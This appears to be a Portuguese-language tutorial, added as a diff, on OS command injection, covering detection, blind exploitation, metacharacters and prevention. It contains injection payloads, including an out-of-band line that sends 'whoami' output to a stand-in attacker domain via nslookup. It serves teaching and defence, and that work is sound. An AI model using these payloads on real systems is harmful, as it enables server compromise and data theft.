@@ -1,0 +1,134 @@
+Injeção de comandos do sistema operacional
+Nesta seção, explicamos o que é injeção de comandos do sistema operacional e descrevemos como as vulnerabilidades podem ser detectadas e exploradas. Também mostramos alguns comandos e técnicas úteis para diferentes sistemas operacionais e descrevemos como prevenir a injeção de comandos do sistema operacional.
+
+injeção de comando do sistema operacional
+Laboratórios
+Se você já conhece os conceitos básicos por trás das vulnerabilidades de injeção de comandos em sistemas operacionais e deseja praticar a exploração delas em alvos realistas e deliberadamente vulneráveis, você pode acessar os laboratórios sobre este tópico através do link abaixo.
+
+Veja todos os laboratórios de injeção de comandos do sistema operacional.
+O que é injeção de comandos do sistema operacional?
+A injeção de comandos do sistema operacional, também conhecida como injeção de shell, permite que um invasor execute comandos do sistema operacional no servidor que está executando um aplicativo, comprometendo totalmente o aplicativo e seus dados. Frequentemente, um invasor pode explorar uma vulnerabilidade de injeção de comandos do sistema operacional para comprometer outras partes da infraestrutura de hospedagem e explorar relações de confiança para direcionar o ataque a outros sistemas dentro da organização.
+
+
+Injetando comandos do sistema operacional
+Neste exemplo, um aplicativo de compras permite que o usuário veja se um item está em estoque em uma loja específica. Essa informação é acessada por meio de uma URL:
+
+https://insecure-website.com/stockStatus?productID=381&storeID=29
+Para fornecer as informações de estoque, o aplicativo precisa consultar vários sistemas legados. Por razões históricas, a funcionalidade é implementada por meio de uma chamada a um comando do shell, utilizando os IDs do produto e da loja como argumentos:
+
+stockreport.pl 381 29
+Este comando exibe a situação do estoque do item especificado, que é retornada ao usuário.
+
+O aplicativo não implementa nenhuma defesa contra injeção de comandos do sistema operacional, portanto, um invasor pode enviar a seguinte entrada para executar um comando arbitrário:
+
+& echo aiwefwlguh &
+Se este parâmetro for inserido productID, o comando executado pela aplicação será:
+
+stockreport.pl & echo aiwefwlguh & 29
+O echocomando faz com que a string fornecida seja exibida na saída. Esta é uma maneira útil de testar alguns tipos de injeção de comandos do sistema operacional. O &caractere é um separador de comandos do shell. Neste exemplo, ele faz com que três comandos separados sejam executados, um após o outro. A saída retornada ao usuário é:
+
+Error - productID was not provided
+aiwefwlguh
+29: command not found
+As três linhas de saída demonstram que:
+
+O comando original stockreport.plfoi executado sem os argumentos esperados e, portanto, retornou uma mensagem de erro.
+O echocomando injetado foi executado e a string fornecida foi exibida na saída.
+O argumento original 29foi executado como um comando, o que causou um erro.
+Colocar o separador de comando adicional &após o comando injetado é útil porque separa o comando injetado de tudo o que o segue. Isso reduz a probabilidade de que o que vier depois impeça a execução do comando injetado.
+
+LAB
+APRENDIZ
+Injeção de comando do sistema operacional, caso simples
+Não resolvido
+Comandos úteis
+Após identificar uma vulnerabilidade de injeção de comandos no sistema operacional, é útil executar alguns comandos iniciais para obter informações sobre o sistema. Abaixo, segue um resumo de alguns comandos úteis em plataformas Linux e Windows:
+
+Objetivo do comando	Linux	Windows
+Nome do usuário atual	whoami	whoami
+Sistema operacional	uname -a	ver
+Configuração de rede	ifconfig	ipconfig /all
+Conexões de rede	netstat -an	netstat -an
+Processos em execução	ps -ef	tasklist
+Vulnerabilidades de injeção cega de comandos do sistema operacional
+Muitas instâncias de injeção de comandos no sistema operacional são vulnerabilidades cegas. Isso significa que o aplicativo não retorna a saída do comando em sua resposta HTTP. Vulnerabilidades cegas ainda podem ser exploradas, mas exigem técnicas diferentes.
+
+Por exemplo, imagine um site que permite aos usuários enviar feedback sobre o site. O usuário insere seu endereço de e-mail e a mensagem de feedback. O aplicativo do lado do servidor gera então um e-mail para um administrador do site contendo o feedback. Para fazer isso, ele faz uma chamada ao mailprograma com os detalhes enviados:
+
+mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
+O resultado do mailcomando (se houver) não é retornado nas respostas do aplicativo, portanto, usar o echopayload não funcionará. Nessa situação, você pode usar diversas outras técnicas para detectar e explorar uma vulnerabilidade.
+
+Detecção de injeção cega de comandos do sistema operacional usando atrasos de tempo
+Você pode usar um comando injetado para acionar um atraso, permitindo confirmar se o comando foi executado com base no tempo de resposta do aplicativo. O pingcomando é uma boa maneira de fazer isso, pois permite especificar o número de pacotes ICMP a serem enviados. Isso possibilita controlar o tempo necessário para a execução do comando:
+
+& ping -c 10 127.0.0.1 &
+Este comando faz com que o aplicativo envie um ping para seu adaptador de rede de loopback por 10 segundos.
+
+LAB
+PRATICANTE
+Injeção cega de comandos do sistema operacional com atrasos de tempo
+Não resolvido
+Exploração de injeção cega de comandos do sistema operacional por meio do redirecionamento da saída.
+Você pode redirecionar a saída do comando injetado para um arquivo na raiz da web, que poderá ser acessado pelo navegador. Por exemplo, se o aplicativo serve recursos estáticos a partir do diretório do sistema de arquivos /var/www/static, você pode enviar a seguinte entrada:
+
+& whoami > /var/www/static/whoami.txt &
+O >caractere envia a saída do whoamicomando para o arquivo especificado. Você pode então usar o navegador para buscar https://vulnerable-website.com/whoami.txto arquivo e visualizar a saída do comando inserido.
+
+LAB
+PRATICANTE
+Injeção cega de comandos do sistema operacional com redirecionamento de saída
+Não resolvido
+Exploração de injeção cega de comandos do sistema operacional usando técnicas fora de banda (OAST).
+Você pode usar um comando injetado que acionará uma interação de rede fora de banda com um sistema que você controla, usando técnicas OAST. Por exemplo:
+
+& nslookup kgji2ohoyw.web-attacker.com &
+Essa carga útil utiliza o nslookupcomando para realizar uma consulta DNS para o domínio especificado. O atacante pode monitorar para verificar se a consulta ocorre, confirmando assim se o comando foi injetado com sucesso.
+
+LAB
+PRATICANTE
+Injeção cega de comandos do sistema operacional com interação fora de banda
+Não resolvido
+O canal fora de banda oferece uma maneira fácil de exfiltrar a saída de comandos injetados:
+
+& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
+Isso provoca uma consulta DNS ao domínio do atacante, contendo o resultado do whoamicomando:
+
+wwwuser.kgji2ohoyw.web-attacker.com
+LAB
+PRATICANTE
+Injeção cega de comandos do sistema operacional com exfiltração de dados fora da banda.
+Não resolvido
+Formas de injetar comandos do sistema operacional
+É possível usar diversos metacaracteres do shell para realizar ataques de injeção de comandos no sistema operacional.
+
+Diversos caracteres funcionam como separadores de comandos, permitindo que comandos sejam encadeados. Os seguintes separadores de comandos funcionam tanto em sistemas Windows quanto em sistemas baseados em Unix:
+
+&
+&&
+|
+||
+Os seguintes separadores de comandos funcionam apenas em sistemas baseados em Unix:
+
+;
+Nova linha ( 0x0aou \n)
+Em sistemas baseados em Unix, você também pode usar crases (`) ou o caractere cifrão ($) para executar um comando injetado diretamente no comando original:
+
+` injected command `
+$(injected command)
+Os diferentes metacaracteres do shell apresentam comportamentos ligeiramente distintos que podem alterar seu funcionamento em determinadas situações. Isso pode impactar a possibilidade de recuperação direta da saída de comandos ou sua utilidade apenas para exploração cega.
+
+Às vezes, a entrada que você controla aparece entre aspas no comando original. Nessa situação, você precisa encerrar o contexto entre aspas (usando `cd` "ou `cd` ') antes de usar os metacaracteres de shell adequados para inserir um novo comando.
+
+Como prevenir ataques de injeção de comandos do sistema operacional
+A maneira mais eficaz de prevenir vulnerabilidades de injeção de comandos do sistema operacional é nunca invocar comandos do sistema operacional a partir do código da camada de aplicação. Em quase todos os casos, existem maneiras diferentes de implementar a funcionalidade necessária usando APIs de plataforma mais seguras.
+
+Se você precisar invocar comandos do sistema operacional com entrada fornecida pelo usuário, deverá realizar uma validação de entrada robusta. Alguns exemplos de validação eficaz incluem:
+
+Validação em relação a uma lista branca de valores permitidos.
+Verificar se a entrada é um número.
+Verificar se a entrada contém apenas caracteres alfanuméricos, sem outras sintaxes ou espaços em branco.
+Nunca tente sanitizar a entrada escapando metacaracteres do shell. Na prática, isso é muito propenso a erros e vulnerável a ser contornado por um atacante habilidoso.
+
+Leia mais
+Encontre vulnerabilidades de injeção de comandos do sistema operacional usando o scanner de vulnerabilidades web do Burp Suite.
+Leia o resumo da apresentação "Hunting Asynchronous Vulnerabilities" da PortSwigger Research, realizada na 44Con e BSides Manchester.
